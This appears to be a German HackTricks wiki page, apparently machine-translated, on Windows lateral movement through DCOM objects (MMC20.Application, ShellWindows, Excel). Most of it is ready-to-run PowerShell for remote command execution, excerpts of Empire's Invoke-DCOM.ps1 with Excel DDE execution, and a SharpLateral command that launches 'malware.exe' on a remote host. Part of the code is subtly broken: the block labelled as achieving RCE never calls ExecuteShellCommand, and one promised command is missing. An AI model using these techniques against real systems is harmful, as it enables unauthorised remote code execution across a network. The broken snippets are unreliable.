# DCOM Exec

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich den [**offiziellen PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) bei oder der [**Telegram-Gruppe**](https://t.me/peass) oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**HackTricks-Repo**](https://github.com/carlospolop/hacktricks) **und das** [**HackTricks-Cloud-Repo**](https://github.com/carlospolop/hacktricks-cloud) **einreichen**.

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## MMC20.Application

**Für weitere Informationen zu dieser Technik lesen Sie den Originalbeitrag von [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**


Das Distributed Component Object Model (DCOM) bietet interessante Möglichkeiten für netzwerkbasierte Interaktionen mit Objekten. Microsoft bietet umfassende Dokumentationen sowohl für DCOM als auch für das Component Object Model (COM), die [hier für DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) und [hier für COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx) abrufbar sind. Eine Liste von DCOM-Anwendungen kann mit dem PowerShell-Befehl abgerufen werden:
```bash
Get-CimInstance Win32_DCOMApplication
```
Der COM-Objekt, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), ermöglicht das Skripting von MMC-Snap-In-Operationen. Dieses Objekt enthält insbesondere eine `ExecuteShellCommand`-Methode unter `Document.ActiveView`. Weitere Informationen zu dieser Methode finden Sie [hier](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Überprüfen Sie dies, indem Sie folgendes ausführen:

Diese Funktion erleichtert die Ausführung von Befehlen über ein Netzwerk durch eine DCOM-Anwendung. Um remote als Administrator mit DCOM zu interagieren, kann PowerShell wie folgt verwendet werden:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Dieser Befehl verbindet sich mit der DCOM-Anwendung und gibt eine Instanz des COM-Objekts zurück. Die ExecuteShellCommand-Methode kann dann aufgerufen werden, um einen Prozess auf dem Remote-Host auszuführen. Der Prozess umfasst die folgenden Schritte:

Überprüfen der Methoden:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Erhalten Sie RCE:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Für weitere Informationen zu dieser Technik lesen Sie den Originalbeitrag [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Das Objekt **MMC20.Application** wurde identifiziert, um explizite "LaunchPermissions" zu fehlen, was zu Berechtigungen führt, die Administratoren Zugriff gewähren. Für weitere Details kann ein Thread [hier](https://twitter.com/tiraniddo/status/817532039771525120) erkundet werden, und die Verwendung von [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET zur Filterung von Objekten ohne explizite Startberechtigung wird empfohlen.

Zwei spezifische Objekte, `ShellBrowserWindow` und `ShellWindows`, wurden aufgrund ihres Fehlens expliziter Startberechtigungen hervorgehoben. Das Fehlen eines `LaunchPermission`-Registrierungseintrags unter `HKCR:\AppID\{guid}` bedeutet keine expliziten Berechtigungen.

###  ShellWindows
Für `ShellWindows`, das keine ProgID hat, erleichtern die .NET-Methoden `Type.GetTypeFromCLSID` und `Activator.CreateInstance` die Objektinstanziierung unter Verwendung seiner AppID. Dieser Prozess nutzt OleView .NET, um die CLSID für `ShellWindows` abzurufen. Nach der Instanziierung ist eine Interaktion über die Methode `WindowsShell.Item` möglich, was zu Methodenaufrufen wie `Document.Application.ShellExecute` führt.

Beispiel-PowerShell-Befehle wurden bereitgestellt, um das Objekt zu instanziieren und Befehle remote auszuführen:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Laterale Bewegung mit Excel DCOM-Objekten

Laterale Bewegung kann durch Ausnutzen von DCOM Excel-Objekten erreicht werden. Für detaillierte Informationen empfiehlt es sich, die Diskussion über die Nutzung von Excel DDE für laterale Bewegung über DCOM im [Cybereason-Blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) zu lesen.

Das Empire-Projekt bietet ein PowerShell-Skript, das die Verwendung von Excel zur Ausführung von Remotecode (RCE) durch Manipulation von DCOM-Objekten demonstriert. Im Folgenden finden Sie Auszüge aus dem Skript, das im [GitHub-Repository von Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) verfügbar ist und verschiedene Methoden zur Ausnutzung von Excel für RCE zeigt:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Automatisierungstools für laterale Bewegung

Zwei Tools werden hervorgehoben, um diese Techniken zu automatisieren:

- **Invoke-DCOM.ps1**: Ein PowerShell-Skript, das vom Empire-Projekt bereitgestellt wird und die Ausführung verschiedener Methoden zur Ausführung von Code auf Remote-Maschinen vereinfacht. Dieses Skript ist im Empire GitHub-Repository verfügbar.

- **SharpLateral**: Ein Tool, das für die Remote-Ausführung von Code entwickelt wurde und mit dem Befehl verwendet werden kann:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Automatische Tools

* Das Powershell-Skript [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) ermöglicht es, alle auskommentierten Methoden zum Ausführen von Code auf anderen Maschinen einfach aufzurufen.
* Sie könnten auch [**SharpLateral**](https://github.com/mertdas/SharpLateral) verwenden:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Referenzen

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
